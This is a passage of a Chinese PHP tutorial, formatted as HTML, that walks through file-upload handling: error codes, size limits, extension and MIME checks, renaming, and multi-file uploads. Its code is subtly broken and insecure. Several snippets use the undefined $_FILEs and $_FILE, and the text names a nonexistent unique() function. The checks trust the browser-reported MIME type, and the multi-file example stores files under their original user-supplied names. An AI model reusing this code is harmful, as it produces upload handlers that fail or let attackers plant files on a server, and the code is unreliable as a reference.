<li>move_uploaded_file()基本上与函数<font color="#FF7F00">rename()</font>相同，<strong>但是它只能用于通过PHP的上传机制上传的文件</strong>。这是一项安全功能，可防止用户欺骗您的脚本，向他们显示与安全相关的数据。</li>
</ol>
<p>&emsp;<br>&emsp;</p>
<h3 id="三-文件上传的步骤"><a href="#三-文件上传的步骤" class="headerlink" title="三. 文件上传的步骤"></a><font color="#FF6347" face="Comic sans MS">三. 文件上传的步骤</font></h3><h4 id="3-1-判断是否有错误码"><a href="#3-1-判断是否有错误码" class="headerlink" title="3.1 判断是否有错误码"></a><font color="#3CB371" face="Comic sans MS">3.1 判断是否有错误码</font></h4><p>使用数组元素：<font color=red>**$_FILES[‘file’][‘error’]**</font><br>即判断<font color="#FF7F00">$_FILES[‘file’][‘error’]返回值！！</font><br>注：错误码中没有5。</p>
<table>
<thead>
<tr>
<th align="center">错误码<br>对应常量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0<br>UPLOAD_ERR_OK</td>
<td align="left">无误，可以继续进行文件上传的后续操作。</td>
</tr>
<tr>
<td align="center">1<br>UPLOAD_ERR_INI_SIZE</td>
<td align="left">超出上传文件的最大限制，upload_max_filesize = 2M php.ini中设置，一<br>般默认为2M。可根据项目中的实际需要来修改</td>
</tr>
<tr>
<td align="center">2<br>UPLOAD_ERR_FORM_SIZE</td>
<td align="left">超出了指定的文件大小,根据项目的业务需求指定上传文件的大小限制</td>
</tr>
<tr>
<td align="center">3<br>UPLOAD_ERR_PARTIAL</td>
<td align="left">只有部分文件被上传</td>
</tr>
<tr>
<td align="center">4<br>UPLOAD_ERR_NO_FILE</td>
<td align="left">文件没有被上传</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">找不到临时文件夹，可能目录不存在或没权限</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">文件写入失败，可能磁盘满了或没有权限</td>
</tr>
</tbody></table>
<p>&emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="keyword">switch</span> ($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &#123;    <span class="comment">//错误码不为0，即文件上传过程中出现了错误</span></span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件过大&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件超出指定大小&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;只有部分文件被上传&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件没有被上传&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;找不到指定文件夹&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;上传出错&lt;br/&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="comment">//错误码为0，即上传成功，可以进行后续处理，处理流程见下文</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h4 id="3-2-判断是否超出文件大小范围"><a href="#3-2-判断是否超出文件大小范围" class="headerlink" title="3.2 判断是否超出文件大小范围"></a><font color="#3CB371" face="Comic sans MS">3.2 判断是否超出文件大小范围</font></h4><p>使用数组元素：<font color=red>**$_FILES[“File’][“size”]**</font></p>
<p>&emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断错误</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//有错误可停止执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前上传文件无误，运行本段代码</span></span><br><span class="line">    <span class="comment">//判断文件是否超出了指定的大小</span></span><br><span class="line">    <span class="comment">//单位为byte</span></span><br><span class="line">    $MAX_FILE_SIZE = <span class="number">100000</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; $MAX_FILE_SIZE) &#123;</span><br><span class="line">        <span class="comment">//判断，如果上传的文件，大小超出了我们给的限制范围，退上传并产生错误提示</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;文件超出指定大小&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>将我们指定的文件大小，定义为$MAX_FILE_SIZE，该变量的计数单位为byte，对应上传文件的 $_FILES[‘file’][‘size’]大小。<br>示例代码中，限制大小约为100K及以下的文件。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="3-3-判断后缀名和mime类型是否符合"><a href="#3-3-判断后缀名和mime类型是否符合" class="headerlink" title="3.3 判断后缀名和mime类型是否符合"></a><font color="#3CB371" face="Comic sans MS">3.3 判断后缀名和mime类型是否符合</font></h4><p>使用数组元素：<font color=red>**$_FILES[“File”][“type”]**</font></p>
<blockquote>
<ol>
<li><strong>MIME</strong>(Multipurpose Internet Mail Extensions)是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</li>
<li>在判断后缀和MIME类型的时候，我们会<font color="#FF7F00">用到PHP的一个函数<strong>in_array()</strong></font>,该函数传入两个参数。<br>第一个参数是要判断的值；<br>第二个参数是范围数组。<br>我们用这个函数来判断文件的后缀名和mime类型是否在允许的范围内。</li>
</ol>
</blockquote>
<p>&emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*判断后缀名和MIME类型是否符合指定需求</span></span><br><span class="line"><span class="comment">例如:</span></span><br><span class="line"><span class="comment">当前项目指定上传后缀为.jpg或.gif的图片，则$allowSuffix = array(&#x27;jpg&#x27;,&#x27;gif&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//定义允许的后缀名数组</span></span><br><span class="line">$myImg = explode(<span class="string">&#x27;.&#x27;</span>, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">explode() 将一个字符串用指定的字符切割，并返回一个数组，这里我们将文件名用&#x27;.&#x27;&#x27;切割,结果存在$myImg</span></span><br><span class="line"><span class="comment">中，文件的后缀名即为数组的最后一个值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$myImgSuffix = array_pop($myImg);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据上传文件名获取文件的后缀名</span></span><br><span class="line"><span class="comment">使用in_array()函数，判断上传文件是否符合要求</span></span><br><span class="line"><span class="comment">当文件后缀名不在我们允许的范围内时退出上传并返回错误信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(!in_array($myImgSuffix, $allowSuffix))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;文件后缀名不符&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mime类型和文件后缀名的对应关系，我们可以通过很多途径查询到，为了避免用户自主修改文件后缀名造成文件无</span></span><br><span class="line"><span class="comment">法使用。</span></span><br><span class="line"><span class="comment">mime类型也必须做出限制检查mime类型，是为了防止上传者直接修改文件后缀名</span></span><br><span class="line"><span class="comment">导致文件不可用或上传的文件不符合要求。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//数组内容为允许上传的mime类型</span></span><br><span class="line">$allowMime = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/jpeg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/pjpeg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image/gif&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], $allowMime))&#123;                      </span><br><span class="line">	<span class="comment">//判断上传文件的mime类型是否在允许的范围内</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;文件格式不正确，请检查&#x27;</span>);</span><br><span class="line">    <span class="comment">//如果不在允许范围内，退出上传并返回错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h4 id="3-4-生成指定的路径和文件名"><a href="#3-4-生成指定的路径和文件名" class="headerlink" title="3.4 生成指定的路径和文件名"></a><font color="#3CB371" face="Comic sans MS">3.4 生成指定的路径和文件名</font></h4><p>我们的文件上传成功了，不会让它保存原名。<br>因为，有些人在原名中有敏感关键词会违反我国的相关法律和法规。<br>我们可以采用<font color="#FF7F00">date()、mt_rand()</font>或者<font color="#FF7F00">unique()</font>生成随机的文件名。</p>
<blockquote>
<ol>
<li><font color="#FF7F00"><strong>$_FILES[“file”][“tmp_name”]：</strong></font>文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</li>
<li>按照项目的文件安排，生成文件存储路径，为了避免文件名重复而产生的错误，按照一定的格式，生成一个随机文件名。</li>
</ol>
</blockquote>
<p>&emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//指定上传文件夹</span></span><br><span class="line">$path = <span class="string">&quot;upload/images/&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据当前时间生成随机文件名，本行代码是使用当前时间 + 随机一个0-9的数字组合成文件名，后缀即为前面取到的文件后缀名</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$name = date(<span class="string">&#x27;Y&#x27;</span>).date(<span class="string">&#x27;m&#x27;</span>).date(<span class="string">&quot;d&quot;</span>).date(<span class="string">&#x27;H&#x27;</span>).date(<span class="string">&#x27;i&#x27;</span>).date(<span class="string">&#x27;s&#x27;</span>).rand(<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;.&#x27;</span>.$myImgSuffix;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h4 id="3-5-判断是否是上传文件"><a href="#3-5-判断是否是上传文件" class="headerlink" title="3.5  判断是否是上传文件"></a><font color="#3CB371" face="Comic sans MS">3.5  判断是否是上传文件</font></h4><p>使用函数：<font color=red><strong>is_uploaded_file()</strong></font></p>
<blockquote>
<ol>
<li>文件上传成功时，系统会将上传的临时文件上传到系统的临时目录中。产生一个临时文件。</li>
<li>同时会产生临时文件名。我们需要做的事情是将临时文件移动到系统的指定目录中。</li>
<li>而移动前不能瞎移动，或者移动错了都是不科学的。移动前我们需要使用相关函数判断上传的文件是不是临时文件。</li>
<li><font color="#FF7F00"><strong>is_uploaded_file()</strong></font>传入一个参数($_FILES中的缓存文件名)，判断传入的名称是不是上传文件。</li>
</ol>
</blockquote>
<p>&emsp;<br>is_uploaded_file()函数是专用的函数，来判断目标文件是否是上传文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用is_uploaded_file()判断是否是上传文件,函数介绍见上文</span></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&emsp;<br>&emsp;</p>
<h4 id="3-6-移动临时文件到指定位置"><a href="#3-6-移动临时文件到指定位置" class="headerlink" title="3.6  移动临时文件到指定位置"></a><font color="#3CB371" face="Comic sans MS">3.6  移动临时文件到指定位置</font></h4><p>使用函数：<font color=red><strong>move_uploaded_file()</strong></font>和数组元素：<font color=red>**$_FILES[“file”][“tmp_name”]**</font></p>
<blockquote>
<ol>
<li>临时文件是真实的临时文件，我们需要将其移动到我们的网站目录下面,让我们网站目录的数据，其他人可以访问到。</li>
<li>我们使用：<font color="#FF7F00">move_uploaded_file()</font>。<br>这个函数是<font color="#FF7F00">**将上传文件移动到指定位置，并命名</font>**。<br>传入两个参数：<br>第一个参数是指定移动的上传文件；<br>第二个参数是指定的文件夹和名称拼接的字符串。</li>
<li>需要注意的是，Linux系统中对目标目录是否有权限及磁盘空间是否足够，否则会导致上传操作失败。</li>
</ol>
</blockquote>
<p>&emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用move_uploaded_file()移动上传文件至指定位置,第一个参数为上传文件，第二个参数为我们在前面指定的上传路径和名称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file($_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $path.$name))&#123;</span><br><span class="line">           <span class="comment">//提示文件上传成功</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>;                                </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">文件移动失败，检查磁盘是否有足够的空间，或者linux类系统中文件夹是否有足够的操作权限</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;                                                </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;不是上传文件&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h3 id="四-多文件上传"><a href="#四-多文件上传" class="headerlink" title="四. 多文件上传"></a><font color="#FF6347" face="Comic sans MS">四. 多文件上传</font></h3><p>多文件上传原理相同，<font color="#FF7F00"><strong>不过在处理数据时，需要对上传数据进行特殊处理</strong>。</font></p>
<p>&emsp;<br>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>单文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;morefile.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file[]&quot;</span>&gt;</span>  //name比单文件上传时多了[]</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file[]&quot;</span>&gt;</span>  //name比单文件上传时多了[]</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里是一个简易的上传页面，form表单同时提交了两个文件。我们 可以通过这个页面提交内容。<br><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>input type=”file” name=”file[]”与之前相比file后<font color="#FF7F00"><strong>多加了一个中括号</strong></font></li>
<li>写了2个或者多个input type=”file” name=”file[]”<br>我们使用 $_FILES 来接收文件信息，打印并查看数组：</li>
</ol>
<p><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump($_FILES); <span class="comment">//打印$_FILES查看数组结构 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出如下：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)  </span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">5</span>) </span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">        <span class="comment">//文件名 </span></span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;psu.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;qwe.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">    <span class="comment">//文件mime类型 </span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>) </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>) </span><br><span class="line">    <span class="comment">//缓存文件 </span></span><br><span class="line">    <span class="string">&#x27;tmp_name&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpF6D5.tmp&#x27;</span> (length=<span class="number">23</span>) </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpF6F5.tmp&#x27;</span> (length=<span class="number">23</span>) </span><br><span class="line">    <span class="comment">//文件错误信息 </span></span><br><span class="line">    <span class="string">&#x27;error&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">0</span> </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">0</span> </span><br><span class="line">    <span class="comment">//文件大小 </span></span><br><span class="line">    <span class="string">&#x27;size&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">225824</span>     </span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">151651</span></span><br></pre></td></tr></table></figure>


<blockquote>
<ol>
<li>我们可以看到，两个文件被存储在一个数组中，<font color="#FF7F00"><strong>键名和上传单文件是相同</strong></font>。所以，需要我们for()循环，来分别取出两个文件的需要用到的数据。</li>
<li>在$_FILES中同时保存了两个文件的数据，我们需要使用一个简单的循环，来读取单个文件的信息，并将文件移动到我们想要放的位置。</li>
</ol>
</blockquote>
<p>&emsp;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count($_FILE[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); $i++) &#123;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">用is_uploaded_file()函数判断是上传文件 </span></span><br><span class="line"><span class="comment">并且没有出现错 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(is_uploaded_file($_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][$i]) &amp;&amp; $_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>][$i] == <span class="number">0</span>)&#123;     </span><br><span class="line">       <span class="keyword">if</span>(move_uploaded_file($_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][$i],<span class="string">&#x27;upload/&#x27;</span>.$_FILE[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][$i]))&#123;</span><br><span class="line">   <span class="comment">//用move_uploaded_file()函数移动文件到指定的位置并使用文件原名 </span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>; </span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>; </span><br><span class="line"></span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>; </span><br><span class="line"></span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&emsp;<br>&emsp;</p>
<h3 id="五-单文件上传完整代码"><a href="#五-单文件上传完整代码" class="headerlink" title="五. 单文件上传完整代码"></a><font color="#FF6347" face="Comic sans MS">五. 单文件上传完整代码</font></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="keyword">switch</span> ($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &#123;</span><br><span class="line"> <span class="comment">//错误码不为0，即文件上传过程中出现了错误</span></span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件过大&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件超出指定大小&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;只有部分文件被上传&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件没有被上传&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;找不到指定文件夹&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;上传出错&lt;br/&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> $MAX_FILE_SIZE = <span class="number">100000</span>;</span><br><span class="line"> <span class="keyword">if</span> ($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; $MAX_FILE_SIZE) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&quot;文件超出指定大小&quot;</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $allowSuffix = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;jpg&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gif&#x27;</span>,</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> $myImg = explode(<span class="string">&#x27;.&#x27;</span>, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"> $myImgSuffix = array_pop($myImg);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_array($myImgSuffix, $allowSuffix)) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&quot;文件后缀名不符&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $allowMime = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/jpeg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/pjpeg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/gif&quot;</span>,</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_array($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], $allowMime)) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&#x27;文件格式不正确，请检查&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $path = <span class="string">&quot;upload/images/&quot;</span>;</span><br><span class="line"> $name = date(<span class="string">&#x27;Y&#x27;</span>) . date(<span class="string">&#x27;m&#x27;</span>) . date(<span class="string">&quot;d&quot;</span>) . date(<span class="string">&#x27;H&#x27;</span>) . date(<span class="string">&#x27;i&#x27;</span>) . date(<span class="string">&#x27;s&#x27;</span>) . rand(<span class="number">0</span>, <span class="number">9</span>) . <span class="string">&#x27;.&#x27;</span> . $myImgSuffix;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (is_uploaded_file($_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (move_uploaded_file($_FILEs[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $path . $name)) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;不是上传文件&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span 